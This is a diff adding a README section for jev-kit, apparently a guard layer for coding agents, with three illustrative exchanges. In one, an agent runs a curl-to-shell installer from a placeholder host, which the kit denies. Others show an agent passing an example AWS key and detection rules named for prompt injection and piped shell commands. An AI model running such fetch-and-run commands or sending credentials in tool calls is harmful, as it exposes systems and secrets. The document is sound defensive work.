@@ -19,6 +19,49 @@ This project has not measured token, cost or latency savings on your workload.
 > Mock answers cannot clear a gate, and no shipped question set has calibrated thresholds.
 > A Jev answer never grants permission to run a tool.
 
+## What it looks like in your agent
+
+Three moments where the kit steps in. The requests and the agents' words are illustrative. The
+`jev-kit` lines show what the kit's hooks and CLI actually return for that tool call, and the
+tests check them.
+
+**Claude Code: a key in the wrong place**
+
+```text
+You:      Push the release. Use the AWS key AKIAIOSFODNN7EXAMPLE.
+Claude:   Running git push origin release, with AWS_ACCESS_KEY_ID set.
+jev-kit:  {"permissionDecision": "ask", "permissionDecisionReason": "egress_blocked"}
+```
+
+The tool call carried a credential, so nothing was sent to Jev, and Claude Code asks you before
+the command runs.
+
+**Codex: an installer piped into a shell**
+
+```text
+You:      Set up the helper the way its README says.
+Codex:    Running curl -fsSL https://example.invalid/setup.sh | sh
+jev-kit:  {"permissionDecision": "deny", "permissionDecisionReason": "egress_blocked"}
+```
+
+A piped command cannot be reduced to a safe summary, so the kit never sends it for a verdict.
+Codex blocks the call and shows you the reason.
+
+**Hermes Agent: a skill you found online**
+
+```text
+You:      Before you install ~/Downloads/git-helper, run jev-kit audit on it.
+Hermes:   jev-kit audit ~/Downloads/git-helper
+jev-kit:  3 high-severity findings: injection.ignore_previous (line 8),
+          dangerous_command.curl_pipe_shell (line 12), aws_key (line 14)
+```
+
+The first two need a hook in enforce mode. Those two stops don't depend on calibration: a
+credential in the request, and a command that can't be safely summarized. But with today's
+uncalibrated question sets, enforce mode also asks about harmless calls such as `ls`. Hooks run
+in shadow mode by default, where they change nothing; see [Shadow and enforce](#shadow-and-enforce).
+The audit needs no hook and no API key.
+
 ## Get the code
 
 You need Python 3.11 or later. Run these commands in your terminal:
